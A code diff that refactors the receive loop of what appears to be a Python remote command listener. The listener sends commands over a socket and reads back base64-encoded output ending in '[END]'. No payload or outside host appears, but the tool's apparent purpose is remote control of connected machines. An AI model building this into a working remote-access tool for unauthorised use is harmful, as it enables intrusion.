@@ -179,8 +179,8 @@ def listen_for_data(conn, mode="print",encoding="b64"):
         recv_decoded = recv.decode('utf-8')
         data = data + recv_decoded
             
-    if encoding == "b64":
-        data = base64_decode(data)
+        if encoding == "b64":
+            data = base64_decode(data)
 
     if DEBUG:
         print(data)
@@ -523,11 +523,7 @@ def listen():
                     send_data(conn, new_cmd)
                     if VERBOSE:
                         print_info("Waiting for data...")
-                    while not data.endswith('[END]'):
-                        recv = conn.recv(128)
-                        recv_decoded = recv.decode('utf-8')
-                        data = data + recv_decoded
-                    print(data.rstrip("[END]"))
+                    listen_for_data(conn)
                     data = ""
                     cmd = ""
                 else:
